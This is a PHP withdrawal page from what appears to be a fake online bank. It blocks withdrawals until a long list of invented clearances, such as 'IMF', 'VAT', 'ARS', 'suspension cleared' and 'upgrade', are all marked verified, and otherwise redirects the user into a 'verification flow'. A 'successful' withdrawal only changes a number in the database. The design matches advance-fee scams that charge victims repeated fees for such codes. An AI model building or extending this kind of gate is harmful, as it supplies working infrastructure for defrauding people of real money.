<?php
session_start();
require_once '../database/db.php';

$user_id = $_SESSION['user_id'] ?? null;
if (!$user_id) {
    header("Location: login.php");
    exit();
}

// Get user info
$stmt = $conn->prepare("SELECT balance, account_status, account_type,
    is_imf_verified, is_vat_verified, is_withdrawal_verified, is_ars_verified,
    is_virtual_card_approved, is_virtual_card_cleared, is_kyc_verified,
    is_account_activated, is_account_upgraded, is_suspension_cleared, is_upgrade_verified
    FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

$balance = floatval($user['balance']);
$success = $error = '';

// Handle withdrawal submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $amount = floatval($_POST['amount']);

    if ($balance <= 0) {
        $error = "❌ You cannot withdraw with a balance of 0.00.";
    } elseif ($amount < 100) {
        $error = "❌ Minimum withdrawal amount is 100.";
    } elseif ($amount > $balance) {
        $error = "❌ You cannot withdraw more than your current balance.";
    } else {
        // ✅ Check if all verification steps are cleared
        $allCleared = $user['is_imf_verified'] &&
                      $user['is_vat_verified'] &&
                      $user['is_withdrawal_verified'] &&
                      $user['is_ars_verified'] &&
                      $user['is_virtual_card_approved'] &&
                      $user['is_virtual_card_cleared'] &&
                      $user['is_kyc_verified'] &&
                      $user['is_account_activated'] &&
                      $user['is_account_upgraded'] &&
                      $user['is_suspension_cleared'] &&
                      $user['is_upgrade_verified'];

        if ($allCleared) {
            // ✅ Withdraw immediately
            $newBalance = $balance - $amount;
            $update = $conn->prepare("UPDATE users SET balance = ? WHERE id = ?");
            $update->execute([$newBalance, $user_id]);

            $log = $conn->prepare("INSERT INTO transactions (user_id, amount, type, status) VALUES (?, ?, 'withdrawal', 'successful')");
            $log->execute([$user_id, $amount]);

            echo '
            <html>
            <head>
                <title>Withdrawal Successful</title>
                <meta http-equiv="refresh" content="5;url=dashboard.php" />
                <style>
                    body {
                        background: #f0f2f5;
                        font-family: Arial;
                        text-align: center;
                        padding-top: 80px;
                    }
                    .box {
                        background: white;
                        display: inline-block;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 0 15px rgba(0,0,0,0.1);
                    }
                    h2 {
                        color: #28a745;
                        margin-bottom: 15px;
                    }
                    p {
                        font-size: 16px;
                        color: #555;
                    }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>✅ Withdrawal Successful!</h2>
                    <p>You withdrew <strong>$' . htmlspecialchars($amount) . '</strong>.</p>
                    <p>Your new balance is <strong>$' . number_format($newBalance, 2) . '</strong>.</p>
                    <p>Redirecting to your dashboard...</p>
                </div>
            </body>
            </html>';
            exit();
        } else {
            // ✅ Store amount and start verification flow
            $_SESSION['withdraw_amount'] = $amount;
            header("Location: virtual_card.php?flow=withdrawal");
            exit();
        }
    }
}
?>

<?php include 'includes/header.php'; ?>

<div class="content-page">
    <div class="content-card">
        <h2>Withdraw Funds</h2>
        <?php if ($error): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php endif; ?>
        
        <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
            <div class="form-group">
                <label for="amount">Amount to Withdraw ($)</label>
                <input type="number" 
                       id="amount" 
                       name="amount" 
                       class="form-control" 
                       required 
                       min="100" 
                       step="0.01"
                       placeholder="Enter amount">
            </div>
            
            <div class="form-group">
                <label for="method">Select Payment Method</label>
                <select id="method" 
                        name="method" 
                        class="form-control" 
                        required>
                    <option value="">Choose your withdrawal method</option>
                    <option value="bank">Bank Transfer</option>
                    <option value="crypto">Cryptocurrency</option>
                    <option value="paypal">PayPal</option>
                    <option value="wise">Wise Transfer</option>
                </select>
            </div>
            
            <button type="submit" class="action-button">
                Proceed with Withdrawal
            </button>
        </form>
    </div>
</div>

<?php include 'includes/footer.php'; ?>
